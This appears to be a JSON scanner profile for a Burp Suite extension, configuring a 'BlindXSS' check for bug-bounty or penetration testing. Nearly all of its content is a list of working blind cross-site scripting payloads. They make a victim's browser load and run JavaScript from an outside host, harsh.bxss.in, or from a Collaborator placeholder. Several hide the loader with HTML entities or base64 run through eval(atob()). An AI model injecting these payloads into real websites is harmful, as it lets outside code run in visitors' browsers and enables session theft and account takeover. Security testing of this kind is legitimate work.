[
  {
    "ProfileName": "BlindXSS",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@harshinsecuriry",
    "Payloads": [
      "true,\u003cscript\u003e$.getScript(\"//{BC}\")\u003c/script\u003e",
      "true,\u003cscript\u003efunction b(){eval(this.responseText)};a\u003dnew XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//{BC}\");a.send();\u003c/script\u003e",
      "true,\"\u003e\u003cscript src\u003dhttp://{BC}\u003e\u003c/script\u003e",
      "true,javascript:eval(\u0027var a\u003ddocument.createElement(\\\u0027script\\\u0027);a.src\u003d\\\u0027http://{BC}\\\u0027;document.body.appendChild(a)\u0027)",
      "true,\u003cscript\u003efunction b(){eval(this.responseText)};a\u003dnew XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//harsh.bxss.in\");a.send();\u003c/script\u003e",
      "true,\"\u003e\u003ciframe srcdoc\u003d\"\u0026#60;\u0026#115;\u0026#99;\u0026#114;\u0026#105;\u0026#112;\u0026#116;\u0026#62;\u0026#118;\u0026#97;\u0026#114;\u0026#32;\u0026#97;\u0026#61;\u0026#112;\u0026#97;\u0026#114;\u0026#101;\u0026#110;\u0026#116;\u0026#46;\u0026#100;\u0026#111;\u0026#99;\u0026#117;\u0026#109;\u0026#101;\u0026#110;\u0026#116;\u0026#46;\u0026#99;\u0026#114;\u0026#101;\u0026#97;\u0026#116;\u0026#101;\u0026#69;\u0026#108;\u0026#101;\u0026#109;\u0026#101;\u0026#110;\u0026#116;\u0026#40;\u0026#34;\u0026#115;\u0026#99;\u0026#114;\u0026#105;\u0026#112;\u0026#116;\u0026#34;\u0026#41;\u0026#59;\u0026#97;\u0026#46;\u0026#115;\u0026#114;\u0026#99;\u0026#61;\u0026#34;\u0026#104;\u0026#116;\u0026#116;\u0026#112;\u0026#115;\u0026#58;\u0026#47;\u0026#47;harsh.bxss.in\u0026#34;\u0026#59;\u0026#112;\u0026#97;\u0026#114;\u0026#101;\u0026#110;\u0026#116;\u0026#46;\u0026#100;\u0026#111;\u0026#99;\u0026#117;\u0026#109;\u0026#101;\u0026#110;\u0026#116;\u0026#46;\u0026#98;\u0026#111;\u0026#100;\u0026#121;\u0026#46;\u0026#97;\u0026#112;\u0026#112;\u0026#101;\u0026#110;\u0026#100;\u0026#67;\u0026#104;\u0026#105;\u0026#108;\u0026#100;\u0026#40;\u0026#97;\u0026#41;\u0026#59;\u0026#60;\u0026#47;\u0026#115;\u0026#99;\u0026#114;\u0026#105;\u0026#112;\u0026#116;\u0026#62;\"\u003e",
      "true,\"\u003e\u003cvideo\u003e\u003csource onerror\u003deval(atob(this.id)) id\u003ddmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFyc2guYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\u0026#61;\u0026#61;\u003e",
      "true,\"\u003e\u003cimg src\u003dx id\u003ddmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFyc2guYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\u0026#61;\u0026#61 onerror\u003deval(atob(this.id))\u003e",
      "true,\"\u003e\u003cinput onfocus\u003deval(atob(this.id)) id\u003ddmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFyc2guYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\u0026#61;\u0026#61; autofocus\u003e",
      "true,\"\u003e\u003cscript src\u003dhttps://harsh.bxss.in\u003e\u003c/script\u003e",
      "true,javascript:eval(\u0027var a\u003ddocument.createElement(\u0027script\u0027);a.src\u003d\u0027https://harsh.bxss.in\u0027;document.body.appendChild(a)\u0027)",
      "true,\"\u003e\u003cinput onfocus\u003deval(atob(this.id)) id\u003ddmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFyc2guYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\u0026#61;\u0026#61; autofocus\u003e"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [],
    "Tags": [
      "XSS",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 0,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 5,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "BlindXSS",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "Blind XSS found with payloads: \u003cbr\u003e \u003cpayload\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      70,
      80,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      21,
      31,
      41,
      51,
      61,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      36,
      81,
      82
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]